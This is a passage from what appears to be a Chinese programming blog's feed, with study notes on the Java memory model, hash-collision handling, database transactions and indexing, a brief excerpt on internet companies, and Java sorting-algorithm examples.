/>如果两个操作在访问同一个变量，且这两个操作有一个是写操作，此时两个操作之间存在数据依赖性。</li></ul><p>编译器重排序和处理器重排序不会改变数据依赖性关系的两个操作之间的执行顺序，即不会重排序。</p><p><strong>注意：</strong><br />这里所说的数据依赖性仅针对单个处理器中执行的指令序列和单个线程中执行的操作，不同处理器和线程间之间的数据依赖性不被编译器和处理器所考虑。</p><ul><li>as-if-serial*<br />不过怎么重排序，单线程下的执行结果不能改变，编译器、runtime（运行时）和处理器都必须遵守as-if-serial语义</li></ul><h3 id="内存屏障memory-barrier"><a class="markdownIt-Anchor" href="#内存屏障memory-barrier"></a> 内存屏障（Memory Barrier）</h3><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/%E5%86%85%E5%AD%98%E5%B1%8F%E9%9A%9C.png" alt="内存屏障" /></p><p><em>volatile内存语义的实现：</em><br /><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/volatile%E5%86%85%E5%AD%98%E8%AF%AD%E4%B9%89%E7%9A%84%E5%AE%9E%E7%8E%B0.png" alt="volatile内存语义的实现" /></p><p>对于volatile关键字，JMM采用保守策略</p><h3 id="happens-before策略"><a class="markdownIt-Anchor" href="#happens-before策略"></a> happens-before策略</h3><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/happens-before%E8%A7%84%E5%88%99.png" alt="happens-before规则" /></p><p><strong>注意：</strong><br />两个操作之间具有happens-before关系，并不意味前一个操作必须要在后一个操作之前执行！仅仅要求前一个操作的执行结果，对于后一个操作是可见的，且前一个操作按顺序排在后一个操作之前。</p><h2 id="解决hash冲突的几种方法"><a class="markdownIt-Anchor" href="#解决hash冲突的几种方法"></a> 解决hash冲突的几种方法</h2><h3 id="开放地址法"><a class="markdownIt-Anchor" href="#开放地址法"></a> 开放地址法</h3><ol><li><p>线性探测法：ThreadLocalMap<br />插入元素时，如果发生冲突，算法会简单的<strong>从该槽位置向后循环遍历hash表，直到找到表中的下一个空槽，并将该元素放入该槽中（会导致相同hash值的元素挨在一起和其他hash值对应的槽被占用）。</strong> 查找元素时，首先散列值所指向的槽，如果没有找到匹配，则继续从该槽遍历hash表，直到：（1）找到相应的元素；（2）找到一个空槽，指示查找的元素不存在，（所以不能随便删除元素）；（3）整个hash表遍历完毕（指示该元素不存在并且hash表是满的）<br />用线性探测法处理冲突，思路清晰，算法简单，但存在下列缺点：<br />① 处理溢出需另编程序。一般可另外设立一个溢出表，专门用来存放上述哈希表中放不下的记录。此溢出表最简单的结构是顺序表，查找方法可用顺序查找。<br />② 按上述算法建立起来的哈希表，删除工作非常困难。如果将此元素删除，查找的时会发现空槽，则会认为要找的元素不存在。只能标上已被删除的标记，否则，将会影响以后的查找。<br />③ 线性探测法很容易产生堆聚现象。所谓堆聚现象，就是存入哈希表的记录在表中连成一片。按照线性探测法处理冲突，如果生成哈希地址的连续序列愈长 ( 即不同关键字值的哈希地址相邻在一起愈长 ) ，则当新的记录加入该表时，与这个序列发生冲突的可能性愈大。因此，哈希地址的较长连续序列比较短连续序列生长得快，这就意味着，一旦出现堆聚 ( 伴随着冲突 ) ，就将引起进一步的堆聚。</p></li><li><p>线程补偿探测法<br />线性补偿探测法的基本思想是：将线性探测的步长从 1 改为 Q ，即将上述算法中的<br />hash ＝ (hash ＋ 1) % m 改为：hash ＝ (hash ＋ Q) % m = hash % m + Q % m，**而且要求 Q 与 m 是互质的，**以便能探测到哈希表中的所有单元。</p></li><li><p>伪随机探测<br />随机探测的基本思想是：将线性探测的步长从常数改为随机数，即令： hash ＝ (hash ＋ RN) % m ，其中 RN 是一个随机数。在实际程序中应预先用随机数发生器产生一个随机序列，将此序列作为依次探测的步长。这样就能使不同的关键字具有不同的探测次序，从而可以避 免或减少堆聚。基于与线性探测法相同的理由，在线性补偿探测法和随机探测法中，删除一个记录后也要打上删除标记。</p></li></ol><h3 id="拉链法"><a class="markdownIt-Anchor" href="#拉链法"></a> 拉链法</h3><p>HashMap<br />拉链法的优点<br />与开放定址法相比，拉链法有如下几个优点：<br />①拉链法处理冲突简单，且无堆积现象，即非同义词决不会发生冲突，因此平均查找长度较短；<br />②由于拉链法中各链表上的结点空间是动态申请的，故它更适合于造表前无法确定表长的情况；<br />③开放定址法为减少冲突，要求装填因子α较小，故当结点规模较大时会浪费很多空间。而拉链法中可取α≥1，且结点较大时，拉链法中增加的指针域可忽略不计，因此节省空间；<br />④在用拉链法构造的散列表中，删除结点的操作易于实现。只要简单地删去链表上相应的结点即可。</p><p>拉链法的缺点<br />　拉链法的缺点是：指针需要额外的空间，故当结点规模较小时，开放定址法较为节省空间，而若将节省的指针空间用来扩大散列表的规模，可使装填因子变小，这又减少了开放定址法中的冲突，从而提高平均查找速度。</p><h3 id="再散列双重散列-多重散列"><a class="markdownIt-Anchor" href="#再散列双重散列-多重散列"></a> 再散列（双重散列、多重散列）</h3><p>当发生冲突时，使用第二个、第三个、哈希函数计算地址，直到无冲突时。缺点：计算时间增加。</p><h3 id="建立一个公共溢出区"><a class="markdownIt-Anchor" href="#建立一个公共溢出区"></a> 建立一个公共溢出区</h3><p>假设哈希函数的值域为[0,m-1],则设向量HashTable[0…m-1]为基本表，另外设立存储空间向量OverTable[0…v]用以存储发生冲突的记录。</p>]]></content>
      
      
      <categories>
          
          <category> 基础知识总结 </category>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于互联网行业的一些看法（摘抄）</title>
      <link href="/view-for-internet/"/>
      <url>/view-for-internet/</url>
      
        <content type="html"><![CDATA[<h2 id="这是最坏的时代也是最好的时代"><a class="markdownIt-Anchor" href="#这是最坏的时代也是最好的时代"></a> 这是最坏的时代，也是最好的时代</h2><h3 id="字节跳动"><a class="markdownIt-Anchor" href="#字节跳动"></a> 字节跳动</h3><p>今日头条打造“千人千面”的客户端，撕开了四大门户的壁垒；抖音利用年轻人的内心，结合其强大的内容分发机制，占据了原本属于微信的用户使用时间，使得腾讯不得不做出调整，也让新浪微博产生了一丝恐惧，而且自有的推荐算法也让其广告业务迅速盈利，使得百度在其原有的凤巢基础上成立新部门以应对头条的威胁。</p><h3 id="滴滴"><a class="markdownIt-Anchor" href="#滴滴"></a> 滴滴</h3><p>背靠腾讯以及阿里这两个大金主，将Uber赶出中国市场，打造了中国最大的出行平台。</p><h3 id="美团"><a class="markdownIt-Anchor" href="#美团"></a> 美团</h3><p>作为全球绝无仅有的独特理念，打造了全球最大的餐饮外卖服务提供商，并大手笔收购摩拜，解决了当下人们的“最后一公里”问题。</p><h3 id="拼多多"><a class="markdownIt-Anchor" href="#拼多多"></a> 拼多多</h3><p>原本以为京东和淘宝已经形成了无人撼动的地位，但是拼多多利用“社交+电商”的模式，利用腾讯提供的优势，作成了多年来腾讯一直想实现的“电商梦”，困扰京东淘宝多年的用户下沉问题也随之解决。</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据库总结</title>
      <link href="/database-summary/"/>
      <url>/database-summary/</url>
      
        <content type="html"><![CDATA[<h2 id="事务四大特性acid"><a class="markdownIt-Anchor" href="#事务四大特性acid"></a> 事务四大特性（ACID）</h2><p>数据库事务是指作为单个逻辑工作单元执行的一系列操作，这些操作要么全做要么全不做，是一个不可分割的工作单位。</p><ol><li>原子性(Atomicity)<br />事务的原子性是指，事务中包含的程序作为数据库的逻辑工作单位，它所做的对数据的修改操作要么全部执行，要么完全不执行。这种特性称为原子性。</li><li>一致性(Consistency)<br />事务一致性指的是在一个事务执行之前和执行之后数据库都必须处于一致性状态。这种特性称为事务的一致性。假如数据库的状态满足所有的完整性约束，就说该数据库是一致的。例如完整性约束：a + b = 10，一个事物改变了a，那么b也随之改变。</li><li>分离性(也称为独立性，lsolation)<br />分离性指并发的事务是相互隔离的。即一个事物内部的操作及正在操作的数据必须封锁起来，不被其他企图进行修改的事务看到。假如并发交叉执行的事务没有任何限制，操纵相关的共享对象的多个并发事务的执行可能引起异常。</li><li>持久性(Durability)<br />持久性意味着当系统或介质发生故障时，确保已提交事务的更新不能丢失。即一旦一个事务提交，DBMS保证它对数据库中数据的改变应该是永久性的，即对已提交事务的更新能恢复。持久性通过数据库备份和恢复来保证。</li></ol><h2 id="事务隔离性以及在mysql中的实践"><a class="markdownIt-Anchor" href="#事务隔离性以及在mysql中的实践"></a> 事务隔离性以及在MySQL中的实践</h2><p>数据库事务是指作为单个逻辑工作单元执行的一系列操作，要么全部执行，要么全部不执行。一方面，当多个应用程序并发访问数据库时，事务可以在应用程序间提供一个隔离方法，防止互相干扰；另一方面，事务为数据库操作序列提供了一个从失败恢复正常的方法。</p><p>当多个线程都开启事务操作数据库中的数据时，数据库系统要能进行隔离操作，以保证各个线程获取数据的准确性。</p><ol><li><p>如果没有隔离，会发生以下情况</p><ul><li>脏读：对于两个事务T1、T2，T1读取了已经被T2更新但还没有提交的字段，之后，若T2回滚，T1读取到的内容就是临时无效的内容。</li><li>不可重复读：对于事务T1、T2，T1需要读取一个字段两次，在第一次和第二次读取之间，T2更新了该字段，导致T1第二次读取到的内容值不同。</li><li>幻读：事务A读取与搜索条件相匹配的若干行。事务B以插入或删除行等方式来修改事务A的结果集，然后再提交。幻读与不可重复读之间的区别是幻读强调的是新增或删除，而不可重复读强调的是修改。比如Mary两次查工资，中间有人改过工资，则两次结果不一样，这就是不可重复读。Mary要查工资一千的人数，第一次查到了10个，中间有人增加了一条工资为一千的人，下次查的时候就变成了11个，好像第一次查询的是幻觉一样。</li></ul></li><li><p>事务的四个隔离级别<br />读未提交、读已提交、可重复读、串行化。四个级别增强逐渐增强，每个级别解决上个级别的一个问题。</p><ul><li>读未提交：另一个事务修改了数据，但尚未提交，而本事务中的select会读到这些未被提交的数据（脏读）。脏读是指另一个事务修改了数据，但尚未提交，而本事务中的select会读到这些未被提交的数据</li><li>读已提交：本事务读取到的是最新的数据（其他事务提交后）。问题是，在同一事务里，前后两次相同的select会读到不同的结果（不可重复读）。不可重复读是指同一个事务执行过程中，另外一个事务提交了新数据，因此本事务先后两次读到的数据结果会不一致。</li><li>可重复读：在同一个事务里，select的结果是事务开始时间点的状态，同样的select操作读到的结果会是一致的，但是有幻读现象。可重复读保证了同一个事务里，查询的结果都是事务开始时的状态（一致性）。但是，如果另一个事务同时提交了新数据，本事务再更新时，就会发现了这些新数据，貌似之前读到的数据都是幻觉，这就是幻读。</li><li>串行化：所有事务只能一个接一个串行执行，不能并行</li></ul></li></ol><p><strong>隔离级别的选择</strong><br />MySQL支持四种隔离级别，默认的是可重复读</p><h2 id="mysql的两种存储引擎区别"><a class="markdownIt-Anchor" href="#mysql的两种存储引擎区别"></a> MYSQL的两种存储引擎区别</h2><ul><li>MyISAM类型不支持事务处理等高级处理，而InnoDB类型支持</li><li>MyISAM表不支持外键，InnoDB支持</li><li>MyISAM锁的粒度是表级，而InnoDB支持行级锁定<br />MyISAM相对简单，所以在效率上要优于InnoDB，小型应用可以考虑使用MyISAM，当你的数据库有大量的写入、更新操作而查询比较少或者数据完整性要求比较高的时候就选择Innodb表。当你的数据库主要以查询为主，相比较而言更新和写入比较少，并且业务方面数据完整性要求不那么严格，就选择mysiam表。</li></ul><p><strong>应用场景：</strong></p><ul><li>MyIASM管理非事务表，提供高速存储和检索以及全文搜索能力，如果在应用中执行大量的select操作，应该选择MyIASM</li><li>InnoDB用于事务处理，具有ACID事务支持等特性，如果在应用中执行大量的insert和update操作，应该选择InnoDB</li></ul><h2 id="数据库的优化从sql语句优化和索引两个部分回答"><a class="markdownIt-Anchor" href="#数据库的优化从sql语句优化和索引两个部分回答"></a> 数据库的优化（从sql语句优化和索引两个部分回答）</h2><ol><li><p>只返回需要的数据</p><ul><li>不要写select * 的语句</li><li>合理写where子句，不要写没有where的SQL语句</li></ul></li><li><p>尽量少做重复的工作</p><ul><li>可以合并一些SQL语句</li></ul></li><li><p>适当建立索引（不是越多越好）但以下几点会进行全表扫描</p><ul><li>左模糊查询‘%…’</li><li>使用了不等操作符!=</li><li>or使用不当，or两边都必须有索引才行</li><li>in、not in</li><li>where子句对字段进行表达式操作</li><li>对于创建的复合索引（从最左边开始组合），查询条件用到的列必须从左边开始不能间隔。否则无效，复合索引的结构与电话簿类似</li><li>全文索引：当对于文件建立了一个以词库为目录的索引（文件大全文索引比模糊匹配效果好）</li></ul></li><li><p>使用join代替子查询</p></li><li><p>使用union代替手动创建临时表</p></li></ol><h2 id="乐观锁与悲观锁"><a class="markdownIt-Anchor" href="#乐观锁与悲观锁"></a> 乐观锁与悲观锁</h2><p>当并发事务同时访问一个资源时，有可能导致数据不一致，因此需要一种机制来将数据访问顺序化，以保证数据库数据的一致性。锁就是其中一种机制。在计算机科学中，锁时在执行多线程时用于强行限制资源访问的同步机制，即用于在并发控制保证对互斥要求的满足。在数据库的锁机制中，数据库管理系统中的并发控制的任务是确保在多个事务同时存取数据库中同一数据时不破坏事务的隔离性和统一性以及数据库的统一性。</p><p>乐观并发控制（乐观锁）和悲观并发控制（悲观锁）是并发控制主要采用的技术手段。</p><p>悲观锁是一种并发控制的方法。它可以阻止一个事务以影响其他用户的方式来修改数据。如果一个事务执行的操作对某行数据应用了锁，那只有当这个事务把锁释放，其他事务才能够执行与该锁冲突的操作。主要用于数据争用激烈的环境，以及发生冲突时使用锁保护数据的成本要低于该锁冲突的操作。</p><p>悲观锁的流程：在对任意记录进行修改前，先尝试为该记录加上排他锁；如果加锁失败，说明该记录正在被修改，那么当前查询可能要等待或者抛出异常。如果成功加锁，那么就可以对记录做修改，事务完成后就会解锁。期间有任何对该记录做修改或加排他锁的操作，都会等待我们解锁或者直接抛出异常。</p><p>悲观锁的缺点：悲观并发控制实际上是“先取锁再访问”的保守策略，为数据处理的安全提供了保证。但是在效率方面，处理加锁的机制会让数据库产生额外的开销，还有增加产生死锁的机会；另外，在只读型事务处理中由于不会产生冲突，也没必要使用锁，这样做只能增加系统负载；还有会降低了并行性，一个事务如果锁定了某行数据，其他事务就必须等待该事务处理完才可以处理那行数据。</p><p>乐观锁，它假设多用户并发的事务在处理时不会彼此互相影响，各事务能够在不产生锁的情况下处理各种影响的那部分数据。在提交数据更新之前，每个事务会先检查在该事务读取数据后，在没有其他事务又修改了该数据。如果其他事务有更新的话，正在提交的事务会进行回滚。</p><p>相对于悲观锁，在对数据库进行处理的时候，乐观锁并不会使用数据库提供的锁机制。一般的实现乐观锁的方式就是记录数据版本。实现数据版本有两种方式，<strong>第一种是使用版本号，第二种是使用时间戳</strong>。</p><p>乐观并发控制相信事务之间的数据竞争(data race)的概率是比较小的，因此尽可能直接做下去，直到提交的时候才去锁定，所以不会产生任何锁和死锁。但如果直接简单这么做，还是有可能会遇到不可预期的结果，例如两个事务都读取了数据库的某一行，经过修改以后写回数据库，这时就遇到了问题。</p><h2 id="关系型数据库和非关系型数据库区别"><a class="markdownIt-Anchor" href="#关系型数据库和非关系型数据库区别"></a> 关系型数据库和非关系型数据库区别</h2><p>一般非关系数据库是基于CAP模型，而传统的关系型数据库是基于ACID模型的</p><ol><li>数据存储结构<br />首先关系型数据库一般都有固定的表结构，并且需要通过DDL语句来修改表结构，不是很容易进行扩展，而非关系数据库的存储机制就有很多了，比如基于文档的、K-V键值对的，还有基于图的等，对于数据的格式十分灵活没有固定的表结构，方便扩展，因此如果业务的数据结构并不是固定的或者经常变动比较大的，那么非关系数据库是个好的选择。</li><li>可扩展性<br />传统的关系型数据库给人一种横向扩展难，不好对数据进行分片等，而一些非关系型数据库则原生就支持数据的水平扩展，并且这可能也是很多NoSQL的一大卖点，其实像MySQL这种关系型数据库的水平扩展也不是很难，即使NoSQL水平扩展容易但对于向跨分片进行joins没有好的解决办法。不管是关系型还是非关系型数据库，解决水平扩展或者跨分片Joins这种场景，在应用层和数据库层中间加一层中间件来做数据处理也许是个好的办法。</li><li>数据一致性<br />非关系型数据库一般强调的是数据最终一致性，而没有像ACID一样强调数据的强一致性，从非关系型数据库中读到的有可能还是处于一个中间态的数据，因此如果你的业务对于数据的一致性要求很高，那么应该选择关系型数据库。非关系型数据库可能更多的偏向于OLAP场景，而关系型数据库更多偏向于OLTP场景。</li></ol><p>博客<a href="http://www.cnblogs.com/wanghongyun/p/6193912.html" target="_blank" rel="noopener">SQL与NoSQL（关系型与非关系型）数据库的区别</a></p><h2 id="聚集索引与非聚集索引以及sql的查询优化技术"><a class="markdownIt-Anchor" href="#聚集索引与非聚集索引以及sql的查询优化技术"></a> 聚集索引与非聚集索引以及SQL的查询优化技术</h2><p>聚集索引：聚集索引的顺序就是数据的物理存储顺序；<br />非聚集索引：索引顺序与数据物理排列顺序无关。<br />正因为如此，所以一个表最多只能有一个聚簇索引。简单来说，聚簇索引的叶子节点就是数据节点，非聚簇索引的叶节点仍然为索引节点，只不过有一个指针指向对应的数据块。</p>]]></content>
      
      
      <categories>
          
          <category> 基础知识总结 </category>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>排序算法</title>
      <link href="/algorithm-sort/"/>
      <url>/algorithm-sort/</url>
      
        <content type="html"><![CDATA[<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Sort;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: hta</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span>: 2018/03/26</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Time</span>: 22:03</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Description</span>: 冒泡排序</span></span><br><span class="line"><span class="comment"> * o(n^2)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">bubbleSort</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">bubbleSort</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.length - <span class="number">1</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; nums.length - i - <span class="number">1</span>; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (nums[j] &gt; nums[j + <span class="number">1</span>]) &#123;</span><br><span class="line">                    <span class="keyword">int</span> tmp = nums[j];</span><br><span class="line">                    nums[j] = nums[j + <span class="number">1</span>];</span><br><span class="line">                    nums[j + <span class="number">1</span>] = tmp;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] nums = &#123;<span class="number">3</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">5</span>&#125;;</span><br><span class="line">        bubbleSort(nums);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> num: nums) &#123;</span><br><span class="line">            System.out.print(num);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Sort;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: hta</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span>: 2018/03/26</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Time</span>: 21:31</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Description</span>: 堆排序</span></span><br><span class="line"><span class="comment"> * o(nlogn)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">// 先建立最大堆，然后排序</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">heapSort</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] nums = &#123;<span class="number">3</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">5</span>&#125;;</span><br><span class="line">        <span class="keyword">int</span> index = nums.length;</span><br><span class="line">        heapify(nums);</span><br><span class="line">        <span class="keyword">while</span> (index &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">int</span> tmp = nums[index - <span class="number">1</span>];</span><br><span class="line">            nums[index - <span class="number">1</span>] = nums[<span class="number">0</span>];</span><br><span class="line">            nums[<span class="number">0</span>] = tmp;</span><br><span class="line"></span><br><span class="line">            index--;</span><br><span class="line">            helper(nums, index, <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> num: nums) &#123;</span><br><span class="line">            System.out.print(num);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">heapify</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = (nums.length - <span class="number">1</span>) / <span class="number">2</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            helper(nums, nums.length, i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">helper</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> len, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (k &lt; len) &#123;</span><br><span class="line">            <span class="keyword">int</span> largest = k;</span><br><span class="line">            <span class="keyword">if</span> (k * <span class="number">2</span> + <span class="number">1</span> &lt; len &amp;&amp; nums[largest] &lt; nums[k * <span class="number">2</span> + <span class="number">1</span>]) &#123;</span><br><span class="line">                largest = k * <span class="number">2</span> + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (k * <span class="number">2</span> + <span class="number">2</span> &lt; len &amp;&amp; nums[largest] &lt; nums[k * <span class="number">2</span> + <span class="number">2</span>]) &#123;</span><br><span class="line">                largest = k * <span class="number">2</span> + <span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (k == largest) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">int</span> tmp = nums[largest];</span><br><span class="line">            nums[largest] = nums[k];</span><br><span class="line">            nums[k] = tmp;</span><br><span class="line"></span><br><span class="line">            k = largest;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Sort;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: hta</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span>: 2018/03/26</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Time</span>: 20:03</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Description</span>: 希尔排序</span></span><br><span class="line"><span class="comment"> * o(n^1.5)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">insertShell</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">insertSort</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.length;</span><br><span class="line">        <span class="keyword">int</span> len = n / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">while</span> (len &gt;= <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n - len; i++) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= i; j++) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (nums[j] &gt; nums[j + len]) &#123;</span><br><span class="line">                        <span class="keyword">int</span> tmp = nums[j];</span><br><span class="line">                        nums[j] = nums[j + len];</span><br><span class="line">                        nums[j + len] = tmp;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            len /= <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] nums = &#123;<span class="number">3</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">5</span>&#125;;</span><br><span class="line">        insertSort(nums);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> num: nums) &#123;</span><br><span class="line">            System.out.print(num);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Sort;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: hta</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span>: 2018/03/26</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Time</span>: 19:52</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Description</span>: 